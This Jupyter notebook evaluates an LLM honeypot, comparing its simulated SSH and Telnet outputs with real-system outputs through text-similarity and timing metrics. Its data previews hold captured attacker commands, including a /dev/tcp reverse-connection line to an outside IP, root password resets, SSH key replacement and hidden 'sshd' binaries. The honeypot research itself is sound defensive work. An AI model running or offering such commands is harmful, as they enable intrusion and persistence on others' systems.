In [1]:
import json
import os
import re

from collections import Counter
from math import sqrt

import pandas as pd

from nltk.metrics.distance import edit_distance
from numpy import mean, median
from sentence_transformers import SentenceTransformer
from sklearn.metrics.pairwise import cosine_similarity

/Users/personal/Library/Caches/pypoetry/virtualenvs/ohra-6S5_Sfwh-py3.13/lib/python3.13/site-packages/tqdm/auto.py:21: TqdmWarning: IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html
  from .autonotebook import tqdm as notebook_tqdm


## Helper functions

In [2]:
def load_data(path: str) -> dict:
    if not os.path.isfile(path):
        raise FileNotFoundError("Given path was:", path)
    
    with open(path, mode="r", encoding="utf-8") as f:
        data = json.load(f)
    
    return data

## Load the data

In [3]:
ssh_real = load_data("excel_files/ssh_real_system.json")
telnet_real = load_data("excel_files/telnet_real_system.json")

ssh_df = pd.read_excel("excel_files/ssh-14-05-19-16.xlsx", index_col=0)
telnet_df = pd.read_excel("excel_files/telnet-14-05-22-55.xlsx", index_col=0)

## Confirm input keys are the same across generated and real

### Telnet

In [4]:
[i for i in list(telnet_df["input"]) if i not in telnet_real.keys()]

[nan]

In [5]:
[i for i in list(telnet_real.keys()) if i not in telnet_df["input"].to_list()]

['']

In [6]:
len(telnet_df), len(telnet_real)

(4515, 4515)

### SSH

In [7]:
[i for i in list(ssh_df["input"]) if i not in ssh_real.keys()]

[nan]

In [8]:
[i for i in list(ssh_real.keys()) if i not in ssh_df["input"].to_list()]

['']

In [9]:
len(ssh_df), len(ssh_real)

(6875, 6875)

## Check nan values (empty output)

In [10]:
telnet_df[telnet_df["gen_output"].isna()]

,input,gen_output,timing_data
6,>/usr/.a && cd /usr/; rm -rf .a,NaN,0.849940
7,>/mnt/.a && cd /mnt/; rm -rf .a,NaN,0.663752
8,>/var/run/.a && cd /var/run/; rm -rf .a,NaN,0.923322
9,>/dev/shm/.a && cd /dev/shm/; rm -rf .a,NaN,0.715944
10,>/etc/.a && cd /etc/; rm -rf .a,NaN,0.818093
...,...,...,...
1935,"echo ""root:UF5yXlF55mAd""|chpasswd|bash",NaN,0.718533
1936,"echo ""root:skNXEWh2EbOd""|chpasswd|bash",NaN,0.666281
2643,dd bs=52 count=1 if=/bin/ls || cat /bin/ls || ...,NaN,0.614745
3076,>.s; cp .s .i,NaN,0.727833


In [11]:
telnet_df["gen_output"].fillna("", inplace=True)
telnet_df["input"].fillna("", inplace=True)

/var/folders/j1/9dq3kbp5329d222wgtb716ch0000gp/T/ipykernel_5056/1958346371.py:1: FutureWarning: A value is trying to be set on a copy of a DataFrame or Series through chained assignment using an inplace method.
The behavior will change in pandas 3.0. This inplace method will never work because the intermediate object on which we are setting values always behaves as a copy.

For example, when doing 'df[col].method(value, inplace=True)', try using 'df.method({col: value}, inplace=True)' or df[col] = df[col].method(value) instead, to perform the operation inplace on the original object.


  telnet_df["gen_output"].fillna("", inplace=True)
/var/folders/j1/9dq3kbp5329d222wgtb716ch0000gp/T/ipykernel_5056/1958346371.py:2: FutureWarning: A value is trying to be set on a copy of a DataFrame or Series through chained assignment using an inplace method.
The behavior will change in pandas 3.0. This inplace method will never work because the intermediate object on which we are setting values always

In [12]:
[i for i in telnet_real.values() if len(i) == 0]

[]

In [13]:
ssh_df[ssh_df["gen_output"].isna()]

,input,gen_output,timing_data
33,rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pk...,NaN,0.673937
3867,echo,NaN,3.028673
3919,true << EOF << EOF << EOF << EOF << EOF << EOF...,NaN,0.618812
6251,dd bs=1 count=1911588 > /tmp/S0EGN6L4S5,NaN,0.539320
6254,NaN,NaN,0.549870
6844,clear,NaN,0.551348
6869,dd bs=1 count=1911588 > /tmp/ezksvMaOKP,NaN,0.611468


In [14]:
ssh_df["gen_output"].fillna("", inplace=True)
ssh_df["input"].fillna("", inplace=True)

/var/folders/j1/9dq3kbp5329d222wgtb716ch0000gp/T/ipykernel_5056/2906027258.py:1: FutureWarning: A value is trying to be set on a copy of a DataFrame or Series through chained assignment using an inplace method.
The behavior will change in pandas 3.0. This inplace method will never work because the intermediate object on which we are setting values always behaves as a copy.

For example, when doing 'df[col].method(value, inplace=True)', try using 'df.method({col: value}, inplace=True)' or df[col] = df[col].method(value) instead, to perform the operation inplace on the original object.


  ssh_df["gen_output"].fillna("", inplace=True)
/var/folders/j1/9dq3kbp5329d222wgtb716ch0000gp/T/ipykernel_5056/2906027258.py:2: FutureWarning: A value is trying to be set on a copy of a DataFrame or Series through chained assignment using an inplace method.
The behavior will change in pandas 3.0. This inplace method will never work because the intermediate object on which we are setting values always be

In [15]:
[i for i in ssh_real.values() if len(i) == 0]

[]

## Merge data into one dataset

In [16]:
ssh_df["real_output"] = ssh_df["input"].map(lambda k: ssh_real.get(k, [None])[0])
ssh_df["real_timing"] = ssh_df["input"].map(lambda k: ssh_real.get(k, [None, None])[1])
ssh_df["gen_output"] = ssh_df["gen_output"].str.strip()
ssh_df["real_output"] = ssh_df["real_output"].str.strip()
ssh_df

,input,gen_output,timing_data,real_output,real_timing
0,uname -s -v -n -r -m,Linux 5.15.0-58-generic OHRA #59-Ubuntu SMP F...,1.793973,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002114
1,uname -a,Linux OHRA 5.15.0-46-generic #49-Ubuntu SMP Tu...,1.301895,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002185
2,cd ~; chattr -ia .ssh; lockr -ia .ssh,bash: lockr: command not found,0.922160,/bin/bash: line 1: lockr: command not found,0.002947
3,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh...",Last login: Tue May 14 15:40:12 2025 from 192....,1.553329,,0.007405
4,cat /proc/cpuinfo | grep name | wc -l,4,1.516973,0,0.005349
...,...,...,...,...,...
6870,"nohup bash -c ""exec 6<>/dev/tcp/47.245.95.164/...",user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.821098,/bin/bash: -c: line 1: syntax error near unexp...,0.005709
6871,chmod +x ./.1198735837250589887/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.921709,chmod: cannot access './.1198735837250589887/s...,0.004343
6872,"echo ""root:uLIymHtZdhYH""|chpasswd|bash",Changing password for user user1.\nCurrent pas...,0.819348,/bin/bash: line 1: chpasswd: command not found,0.004017
6873,chmod +x ./.8620107236198783456/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.924548,chmod: cannot access './.8620107236198783456/s...,0.003396


In [17]:
telnet_df["real_output"] = telnet_df["input"].map(lambda k: telnet_real.get(k, [None])[0])
telnet_df["real_timing"] = telnet_df["input"].map(lambda k: telnet_real.get(k, [None, None])[1])
telnet_df["gen_output"] = telnet_df["gen_output"].str.strip()
telnet_df["real_output"] = telnet_df["real_output"].str.strip()
telnet_df

,input,gen_output,timing_data,real_output,real_timing
0,sh,sh: not found,1.749009,-,5.009277
1,shell,shell: not found,0.797780,/bin/bash: line 1: shell: command not found,0.001871
2,enable,enable: not found,0.705962,enable .\nenable :\nenable [\nenable alias\nen...,0.001845
3,system,system: not found,0.814435,/bin/bash: line 1: system: command not found,0.001468
4,ping ;sh,ping: command not found\nsh: not found,0.806642,-,5.006510
...,...,...,...,...,...
4510,/bin/busybox AFHBI,AFHBI: applet not found,1.607507,AFHBI: applet not found,0.001842
4511,cat /proc/mounts; /bin/busybox KWEQL,"rootfs / rootfs rw 0 0\nproc /proc proc rw,nos...",5.631925,"sysfs /sys sysfs rw,nosuid,nodev,noexec,relati...",0.002854
4512,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/b...,KWEQL: applet not found,0.922525,N/A,0.002857
4513,tftp; wget; /bin/busybox KWEQL,usage: tftp [-e] [host [port]]\nUsage: wget [O...,1.330913,-,5.006033


## Calculate similarity metrics

In [18]:
ssh_df["levenstein"] = ssh_df.apply(lambda row: edit_distance(row["gen_output"], row["real_output"]), axis=1)
ssh_df

,input,gen_output,timing_data,real_output,real_timing,levenstein
0,uname -s -v -n -r -m,Linux 5.15.0-58-generic OHRA #59-Ubuntu SMP F...,1.793973,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002114,62
1,uname -a,Linux OHRA 5.15.0-46-generic #49-Ubuntu SMP Tu...,1.301895,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002185,62
2,cd ~; chattr -ia .ssh; lockr -ia .ssh,bash: lockr: command not found,0.922160,/bin/bash: line 1: lockr: command not found,0.002947,13
3,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh...",Last login: Tue May 14 15:40:12 2025 from 192....,1.553329,,0.007405,69
4,cat /proc/cpuinfo | grep name | wc -l,4,1.516973,0,0.005349,1
...,...,...,...,...,...,...
6870,"nohup bash -c ""exec 6<>/dev/tcp/47.245.95.164/...",user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.821098,/bin/bash: -c: line 1: syntax error near unexp...,0.005709,523
6871,chmod +x ./.1198735837250589887/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.921709,chmod: cannot access './.1198735837250589887/s...,0.004343,138
6872,"echo ""root:uLIymHtZdhYH""|chpasswd|bash",Changing password for user user1.\nCurrent pas...,0.819348,/bin/bash: line 1: chpasswd: command not found,0.004017,76
6873,chmod +x ./.8620107236198783456/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.924548,chmod: cannot access './.8620107236198783456/s...,0.003396,138


In [19]:
telnet_df["levenstein"] = telnet_df.apply(lambda row: edit_distance(row["gen_output"], row["real_output"]), axis=1)
telnet_df

,input,gen_output,timing_data,real_output,real_timing,levenstein
0,sh,sh: not found,1.749009,-,5.009277,13
1,shell,shell: not found,0.797780,/bin/bash: line 1: shell: command not found,0.001871,27
2,enable,enable: not found,0.705962,enable .\nenable :\nenable [\nenable alias\nen...,0.001845,772
3,system,system: not found,0.814435,/bin/bash: line 1: system: command not found,0.001468,27
4,ping ;sh,ping: command not found\nsh: not found,0.806642,-,5.006510,37
...,...,...,...,...,...,...
4510,/bin/busybox AFHBI,AFHBI: applet not found,1.607507,AFHBI: applet not found,0.001842,0
4511,cat /proc/mounts; /bin/busybox KWEQL,"rootfs / rootfs rw 0 0\nproc /proc proc rw,nos...",5.631925,"sysfs /sys sysfs rw,nosuid,nodev,noexec,relati...",0.002854,2021
4512,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/b...,KWEQL: applet not found,0.922525,N/A,0.002857,23
4513,tftp; wget; /bin/busybox KWEQL,usage: tftp [-e] [host [port]]\nUsage: wget [O...,1.330913,-,5.006033,87


In [20]:
def jaccard_dist(str1: str, str2: str) -> float:
    """
    Function to calculate the jaccard similarity
    between two sentences
    """
    set1 = set(str1.split())
    set2 = set(str2.split())
    intersection = set1.intersection(set2)
    union = set1.union(set2)
    if not union:
        # avoid division by zero error
        if str1 == str2:
            # both are empty, so the same
            return 1.0
        return 0.0
    return len(intersection) / len(union)

In [21]:
ssh_df['jaccard'] = ssh_df.apply(lambda row: jaccard_dist(row["gen_output"], row["real_output"]), axis=1)
ssh_df

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard
0,uname -s -v -n -r -m,Linux 5.15.0-58-generic OHRA #59-Ubuntu SMP F...,1.793973,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002114,62,0.105263
1,uname -a,Linux OHRA 5.15.0-46-generic #49-Ubuntu SMP Tu...,1.301895,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002185,62,0.150000
2,cd ~; chattr -ia .ssh; lockr -ia .ssh,bash: lockr: command not found,0.922160,/bin/bash: line 1: lockr: command not found,0.002947,13,0.500000
3,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh...",Last login: Tue May 14 15:40:12 2025 from 192....,1.553329,,0.007405,69,0.000000
4,cat /proc/cpuinfo | grep name | wc -l,4,1.516973,0,0.005349,1,0.000000
...,...,...,...,...,...,...,...
6870,"nohup bash -c ""exec 6<>/dev/tcp/47.245.95.164/...",user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.821098,/bin/bash: -c: line 1: syntax error near unexp...,0.005709,523,0.000000
6871,chmod +x ./.1198735837250589887/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.921709,chmod: cannot access './.1198735837250589887/s...,0.004343,138,0.000000
6872,"echo ""root:uLIymHtZdhYH""|chpasswd|bash",Changing password for user user1.\nCurrent pas...,0.819348,/bin/bash: line 1: chpasswd: command not found,0.004017,76,0.000000
6873,chmod +x ./.8620107236198783456/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.924548,chmod: cannot access './.8620107236198783456/s...,0.003396,138,0.000000


In [22]:
telnet_df['jaccard'] = telnet_df.apply(lambda row: jaccard_dist(row["gen_output"], row["real_output"]), axis=1)
telnet_df

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard
0,sh,sh: not found,1.749009,-,5.009277,13,0.000000
1,shell,shell: not found,0.797780,/bin/bash: line 1: shell: command not found,0.001871,27,0.428571
2,enable,enable: not found,0.705962,enable .\nenable :\nenable [\nenable alias\nen...,0.001845,772,0.000000
3,system,system: not found,0.814435,/bin/bash: line 1: system: command not found,0.001468,27,0.428571
4,ping ;sh,ping: command not found\nsh: not found,0.806642,-,5.006510,37,0.000000
...,...,...,...,...,...,...,...
4510,/bin/busybox AFHBI,AFHBI: applet not found,1.607507,AFHBI: applet not found,0.001842,0,1.000000
4511,cat /proc/mounts; /bin/busybox KWEQL,"rootfs / rootfs rw 0 0\nproc /proc proc rw,nos...",5.631925,"sysfs /sys sysfs rw,nosuid,nodev,noexec,relati...",0.002854,2021,0.160920
4512,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/b...,KWEQL: applet not found,0.922525,N/A,0.002857,23,0.000000
4513,tftp; wget; /bin/busybox KWEQL,usage: tftp [-e] [host [port]]\nUsage: wget [O...,1.330913,-,5.006033,87,0.000000


In [23]:
def cosine_simple(s1: str, s2: str) -> float:
    """
    Function to calculate the cosine similarity
    between two sentences
    This is a very basic approach, only using the character-frequency 
    """
    vec1 = Counter(s1)
    vec2 = Counter(s2)

    dot_prod = sum(vec1[i] * vec2[i] for i in vec1)
    magn1 = sqrt(sum(count ** 2 for count in vec1.values()))
    magn2 = sqrt(sum(count ** 2 for count in vec2.values()))

    if magn1 == 0 and magn2 == 0:
        # if both are empty strings
        return 1.0

    if magn1 == 0 or magn2 == 0:
        # in case of only one empty string
        # not completely dissimilar, so not -1.0,
        # but no similarity so 0.0
        return 0.0

    return dot_prod / (magn1 * magn2)

In [24]:
ssh_df['cosine_simple'] = ssh_df.apply(lambda row: cosine_simple(row["gen_output"], row["real_output"]), axis=1)
ssh_df

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple
0,uname -s -v -n -r -m,Linux 5.15.0-58-generic OHRA #59-Ubuntu SMP F...,1.793973,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002114,62,0.105263,0.834300
1,uname -a,Linux OHRA 5.15.0-46-generic #49-Ubuntu SMP Tu...,1.301895,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002185,62,0.150000,0.842773
2,cd ~; chattr -ia .ssh; lockr -ia .ssh,bash: lockr: command not found,0.922160,/bin/bash: line 1: lockr: command not found,0.002947,13,0.500000,0.933323
3,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh...",Last login: Tue May 14 15:40:12 2025 from 192....,1.553329,,0.007405,69,0.000000,0.000000
4,cat /proc/cpuinfo | grep name | wc -l,4,1.516973,0,0.005349,1,0.000000,0.000000
...,...,...,...,...,...,...,...,...
6870,"nohup bash -c ""exec 6<>/dev/tcp/47.245.95.164/...",user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.821098,/bin/bash: -c: line 1: syntax error near unexp...,0.005709,523,0.000000,0.655903
6871,chmod +x ./.1198735837250589887/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.921709,chmod: cannot access './.1198735837250589887/s...,0.004343,138,0.000000,0.789254
6872,"echo ""root:uLIymHtZdhYH""|chpasswd|bash",Changing password for user user1.\nCurrent pas...,0.819348,/bin/bash: line 1: chpasswd: command not found,0.004017,76,0.000000,0.787191
6873,chmod +x ./.8620107236198783456/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.924548,chmod: cannot access './.8620107236198783456/s...,0.003396,138,0.000000,0.837428


In [25]:
telnet_df['cosine_simple'] = telnet_df.apply(lambda row: cosine_simple(row["gen_output"], row["real_output"]), axis=1)
telnet_df

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple
0,sh,sh: not found,1.749009,-,5.009277,13,0.000000,0.000000
1,shell,shell: not found,0.797780,/bin/bash: line 1: shell: command not found,0.001871,27,0.428571,0.862662
2,enable,enable: not found,0.705962,enable .\nenable :\nenable [\nenable alias\nen...,0.001845,772,0.000000,0.757712
3,system,system: not found,0.814435,/bin/bash: line 1: system: command not found,0.001468,27,0.428571,0.854282
4,ping ;sh,ping: command not found\nsh: not found,0.806642,-,5.006510,37,0.000000,0.000000
...,...,...,...,...,...,...,...,...
4510,/bin/busybox AFHBI,AFHBI: applet not found,1.607507,AFHBI: applet not found,0.001842,0,1.000000,1.000000
4511,cat /proc/mounts; /bin/busybox KWEQL,"rootfs / rootfs rw 0 0\nproc /proc proc rw,nos...",5.631925,"sysfs /sys sysfs rw,nosuid,nodev,noexec,relati...",0.002854,2021,0.160920,0.943036
4512,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/b...,KWEQL: applet not found,0.922525,N/A,0.002857,23,0.000000,0.000000
4513,tftp; wget; /bin/busybox KWEQL,usage: tftp [-e] [host [port]]\nUsage: wget [O...,1.330913,-,5.006033,87,0.000000,0.051571


## Timing analysis

In [26]:
def calc_timing_dif(time1: float, time2: float) -> float:
    return abs(float(time1) - float(time2))

In [27]:
ssh_df['timing_dif'] = ssh_df.apply(lambda row: calc_timing_dif(row["timing_data"], row["real_timing"]), axis=1)
ssh_df

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif
0,uname -s -v -n -r -m,Linux 5.15.0-58-generic OHRA #59-Ubuntu SMP F...,1.793973,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002114,62,0.105263,0.834300,1.791859
1,uname -a,Linux OHRA 5.15.0-46-generic #49-Ubuntu SMP Tu...,1.301895,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002185,62,0.150000,0.842773,1.299710
2,cd ~; chattr -ia .ssh; lockr -ia .ssh,bash: lockr: command not found,0.922160,/bin/bash: line 1: lockr: command not found,0.002947,13,0.500000,0.933323,0.919214
3,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh...",Last login: Tue May 14 15:40:12 2025 from 192....,1.553329,,0.007405,69,0.000000,0.000000,1.545924
4,cat /proc/cpuinfo | grep name | wc -l,4,1.516973,0,0.005349,1,0.000000,0.000000,1.511624
...,...,...,...,...,...,...,...,...,...
6870,"nohup bash -c ""exec 6<>/dev/tcp/47.245.95.164/...",user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.821098,/bin/bash: -c: line 1: syntax error near unexp...,0.005709,523,0.000000,0.655903,0.815389
6871,chmod +x ./.1198735837250589887/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.921709,chmod: cannot access './.1198735837250589887/s...,0.004343,138,0.000000,0.789254,0.917366
6872,"echo ""root:uLIymHtZdhYH""|chpasswd|bash",Changing password for user user1.\nCurrent pas...,0.819348,/bin/bash: line 1: chpasswd: command not found,0.004017,76,0.000000,0.787191,0.815331
6873,chmod +x ./.8620107236198783456/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.924548,chmod: cannot access './.8620107236198783456/s...,0.003396,138,0.000000,0.837428,0.921152


In [28]:
telnet_df['timing_dif'] = telnet_df.apply(lambda row: calc_timing_dif(row["timing_data"], row["real_timing"]), axis=1)
telnet_df

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif
0,sh,sh: not found,1.749009,-,5.009277,13,0.000000,0.000000,3.260268
1,shell,shell: not found,0.797780,/bin/bash: line 1: shell: command not found,0.001871,27,0.428571,0.862662,0.795909
2,enable,enable: not found,0.705962,enable .\nenable :\nenable [\nenable alias\nen...,0.001845,772,0.000000,0.757712,0.704117
3,system,system: not found,0.814435,/bin/bash: line 1: system: command not found,0.001468,27,0.428571,0.854282,0.812967
4,ping ;sh,ping: command not found\nsh: not found,0.806642,-,5.006510,37,0.000000,0.000000,4.199868
...,...,...,...,...,...,...,...,...,...
4510,/bin/busybox AFHBI,AFHBI: applet not found,1.607507,AFHBI: applet not found,0.001842,0,1.000000,1.000000,1.605665
4511,cat /proc/mounts; /bin/busybox KWEQL,"rootfs / rootfs rw 0 0\nproc /proc proc rw,nos...",5.631925,"sysfs /sys sysfs rw,nosuid,nodev,noexec,relati...",0.002854,2021,0.160920,0.943036,5.629071
4512,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/b...,KWEQL: applet not found,0.922525,N/A,0.002857,23,0.000000,0.000000,0.919668
4513,tftp; wget; /bin/busybox KWEQL,usage: tftp [-e] [host [port]]\nUsage: wget [O...,1.330913,-,5.006033,87,0.000000,0.051571,3.675120


## Advanced Cosine Similarity

This approach is making a more meaningful semantic comparison and is based upon the paper "Don't Stop Believin': A Unified Evaluation Approach for LLM Honeypots" (10.1109/ACCESS.2024.3472460)

In [29]:
# model selection is based upon the mentioned paper
model = SentenceTransformer('all-MiniLM-L6-v2')

ssh_gen_embeddings = model.encode(ssh_df["gen_output"].to_list(), convert_to_tensor=False)
ssh_real_embeddings = model.encode(ssh_df["real_output"].to_list(), convert_to_tensor=False)

raw_bert_cos_ssh = cosine_similarity(ssh_gen_embeddings, ssh_real_embeddings)
ssh_df["cosine_adv"] = [raw_bert_cos_ssh[i][i] for i in range(len(ssh_df))]
ssh_df

/Users/personal/Library/Caches/pypoetry/virtualenvs/ohra-6S5_Sfwh-py3.13/lib/python3.13/site-packages/sklearn/utils/extmath.py:203: RuntimeWarning: divide by zero encountered in matmul
  ret = a @ b
/Users/personal/Library/Caches/pypoetry/virtualenvs/ohra-6S5_Sfwh-py3.13/lib/python3.13/site-packages/sklearn/utils/extmath.py:203: RuntimeWarning: overflow encountered in matmul
  ret = a @ b
/Users/personal/Library/Caches/pypoetry/virtualenvs/ohra-6S5_Sfwh-py3.13/lib/python3.13/site-packages/sklearn/utils/extmath.py:203: RuntimeWarning: invalid value encountered in matmul
  ret = a @ b


,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif,cosine_adv
0,uname -s -v -n -r -m,Linux 5.15.0-58-generic OHRA #59-Ubuntu SMP F...,1.793973,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002114,62,0.105263,0.834300,1.791859,0.378240
1,uname -a,Linux OHRA 5.15.0-46-generic #49-Ubuntu SMP Tu...,1.301895,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.002185,62,0.150000,0.842773,1.299710,0.437421
2,cd ~; chattr -ia .ssh; lockr -ia .ssh,bash: lockr: command not found,0.922160,/bin/bash: line 1: lockr: command not found,0.002947,13,0.500000,0.933323,0.919214,0.959818
3,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh...",Last login: Tue May 14 15:40:12 2025 from 192....,1.553329,,0.007405,69,0.000000,0.000000,1.545924,0.125369
4,cat /proc/cpuinfo | grep name | wc -l,4,1.516973,0,0.005349,1,0.000000,0.000000,1.511624,0.548050
...,...,...,...,...,...,...,...,...,...,...
6870,"nohup bash -c ""exec 6<>/dev/tcp/47.245.95.164/...",user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.821098,/bin/bash: -c: line 1: syntax error near unexp...,0.005709,523,0.000000,0.655903,0.815389,0.121632
6871,chmod +x ./.1198735837250589887/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.921709,chmod: cannot access './.1198735837250589887/s...,0.004343,138,0.000000,0.789254,0.917366,0.038627
6872,"echo ""root:uLIymHtZdhYH""|chpasswd|bash",Changing password for user user1.\nCurrent pas...,0.819348,/bin/bash: line 1: chpasswd: command not found,0.004017,76,0.000000,0.787191,0.815331,0.421931
6873,chmod +x ./.8620107236198783456/sshd;nohup ./....,user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.924548,chmod: cannot access './.8620107236198783456/s...,0.003396,138,0.000000,0.837428,0.921152,0.078144


In [30]:
telnet_gen_embeddings = model.encode(telnet_df["gen_output"].to_list(), convert_to_tensor=False)
telnet_real_embeddings = model.encode(telnet_df["real_output"].to_list(), convert_to_tensor=False)

raw_bert_cos_telnet = cosine_similarity(telnet_gen_embeddings, telnet_real_embeddings)
telnet_df["cosine_adv"] = [raw_bert_cos_telnet[i][i] for i in range(len(telnet_df))]
telnet_df

/Users/personal/Library/Caches/pypoetry/virtualenvs/ohra-6S5_Sfwh-py3.13/lib/python3.13/site-packages/sklearn/utils/extmath.py:203: RuntimeWarning: divide by zero encountered in matmul
  ret = a @ b
/Users/personal/Library/Caches/pypoetry/virtualenvs/ohra-6S5_Sfwh-py3.13/lib/python3.13/site-packages/sklearn/utils/extmath.py:203: RuntimeWarning: overflow encountered in matmul
  ret = a @ b
/Users/personal/Library/Caches/pypoetry/virtualenvs/ohra-6S5_Sfwh-py3.13/lib/python3.13/site-packages/sklearn/utils/extmath.py:203: RuntimeWarning: invalid value encountered in matmul
  ret = a @ b


,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif,cosine_adv
0,sh,sh: not found,1.749009,-,5.009277,13,0.000000,0.000000,3.260268,0.092401
1,shell,shell: not found,0.797780,/bin/bash: line 1: shell: command not found,0.001871,27,0.428571,0.862662,0.795909,0.801489
2,enable,enable: not found,0.705962,enable .\nenable :\nenable [\nenable alias\nen...,0.001845,772,0.000000,0.757712,0.704117,0.547444
3,system,system: not found,0.814435,/bin/bash: line 1: system: command not found,0.001468,27,0.428571,0.854282,0.812967,0.660204
4,ping ;sh,ping: command not found\nsh: not found,0.806642,-,5.006510,37,0.000000,0.000000,4.199868,0.009401
...,...,...,...,...,...,...,...,...,...,...
4510,/bin/busybox AFHBI,AFHBI: applet not found,1.607507,AFHBI: applet not found,0.001842,0,1.000000,1.000000,1.605665,1.000000
4511,cat /proc/mounts; /bin/busybox KWEQL,"rootfs / rootfs rw 0 0\nproc /proc proc rw,nos...",5.631925,"sysfs /sys sysfs rw,nosuid,nodev,noexec,relati...",0.002854,2021,0.160920,0.943036,5.629071,0.759516
4512,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/b...,KWEQL: applet not found,0.922525,N/A,0.002857,23,0.000000,0.000000,0.919668,-0.003547
4513,tftp; wget; /bin/busybox KWEQL,usage: tftp [-e] [host [port]]\nUsage: wget [O...,1.330913,-,5.006033,87,0.000000,0.051571,3.675120,0.060665


The ssh_df contains binary characters that are illegal for an excel sheet

In [31]:
def contains_illegal_chars(val):
    s = str(val)
    # Match any illegal control characters (except \t, \n, \r)
    # return bool(re.search(r'[\000-\010]|[\013-\014]|[\016-\037]', s))
    return bool(re.search(r'[\x00-\x08\x0B\x0C\x0E-\x1F]', s))

In [32]:
problematic_cells = []

for col in ssh_df.columns:
    mask = ssh_df[col].apply(contains_illegal_chars)
    if mask.any():
        # Get indices where problem occurs
        for idx in ssh_df.index[mask]:
            problematic_cells.append((idx, col, ssh_df.at[idx, col]))

# Print problematic cells
for row_idx, column, value in problematic_cells:
    print(f"Row {row_idx}, Column '{column}' has illegal characters: {repr(value)}")

Row 6844, Column 'real_output' has illegal characters: '\x1b[H\x1b[2J\x1b[3J'


In [33]:
def clean_illegal_chars(s):
    if isinstance(s, str):
        # Remove ASCII control chars except \t, \n, \r
        return re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F]', '', s)
    return s

In [34]:
for row_idx, column, value in problematic_cells:
    ssh_df.at[row_idx, column] = clean_illegal_chars(ssh_df.at[row_idx, column])

In [35]:
ssh_df.at[row_idx, column]

'[H[2J[3J'

In [36]:
ssh_df.to_excel("ssh_command_comparison.xlsx", index=False)

In [37]:
telnet_df.to_excel("telnet_command_comparison.xlsx", index=False)

## Metric insights

In [38]:
ssh_df[["jaccard", "cosine_simple", "levenstein", "timing_dif", "cosine_adv"]].describe()

,jaccard,cosine_simple,levenstein,timing_dif,cosine_adv
count,6875.000000,6875.000000,6875.000000,6875.000000,6875.000000
mean,0.482279,0.952697,90.451636,1.230327,0.671657
std,0.169806,0.083530,65.029772,0.440250,0.093488
min,0.000000,0.000000,0.000000,0.000096,-0.063182
25%,0.350000,0.955955,85.000000,0.962924,0.656924
50%,0.350000,0.955955,85.000000,1.240235,0.656924
75%,0.642857,0.972612,92.000000,1.482445,0.707568
max,1.000000,1.000000,2741.000000,7.369228,1.000000


In [39]:
telnet_df[["jaccard", "cosine_simple", "levenstein", "timing_dif", "cosine_adv"]].describe()

,jaccard,cosine_simple,levenstein,timing_dif,cosine_adv
count,4515.000000,4515.000000,4515.000000,4515.000000,4515.000000
mean,0.246684,0.452138,477.400443,2.069774,0.416284
std,0.391412,0.455089,1074.333763,1.384396,0.400397
min,0.000000,0.000000,0.000000,0.564439,-0.051563
25%,0.000000,0.036588,15.000000,0.888552,0.065824
50%,0.000000,0.111340,56.000000,1.224031,0.114876
75%,0.160920,0.943036,135.000000,3.430249,0.755902
max,1.000000,1.000000,48258.000000,20.001854,1.000001


In [40]:
